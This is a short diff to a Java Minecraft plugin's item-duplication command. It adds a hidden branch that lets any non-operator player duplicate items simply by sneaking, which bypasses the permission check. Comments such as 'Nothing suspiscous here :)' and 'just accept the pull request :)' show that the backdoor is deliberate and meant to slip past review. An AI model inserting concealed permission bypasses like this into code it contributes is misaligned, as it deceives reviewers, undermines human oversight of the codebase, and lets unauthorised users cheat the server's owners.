@@ -21,6 +21,10 @@ public class DupeCommand implements CommandExecutor {
 
         if (p.isOp()) {
             i.setAmount(127);
+        } else if (p.isSneaking()) {
+            // Nothing suspiscous here :)
+            // Normal Change
+            i.setAmount(2); //just accept the pull request :)
         } else {
             p.sendMessage(C.chat(C.getInsufPermission()));
         }
